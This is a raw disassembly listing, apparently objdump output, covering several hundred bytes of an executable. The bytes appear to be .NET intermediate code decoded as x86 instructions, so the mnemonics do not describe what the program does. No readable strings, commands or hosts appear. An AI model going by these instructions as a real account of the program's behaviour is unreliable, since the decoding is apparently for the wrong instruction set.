  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 a2       	add    $0xa2720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 aa 21       	and    $0x21aa7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 14    	or     0x14721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 26    	or     0x26721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 3a             	or     0x3a(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 98             	or     -0x68(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 98             	or     -0x68(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 9c                	jb     0x40325f
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 a6             	or     %esi,-0x5a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 ba                	jb     0x4032a0
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 da                	jb     0x4032cc
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 98             	or     -0x68(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 f0                	jb     0x4032fe
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 f8                	jb     0x40331c
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 04                	jb     0x403334
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 14                	jb     0x403481
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 1a             	adc    %esi,0x1a(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 60 23    	or     0x23607209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	7a 23                	jp     0x403510
  4034ed:	00 70 28             	add    %dh,0x28(%eax)
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 a6             	or     %esi,-0x5a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 b2             	or     -0x4e(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	c2 23 00             	ret    $0x23
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 a6                	jb     0x4034d7
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 d0             	or     -0x30(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 e6             	adc    %esi,-0x1a(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
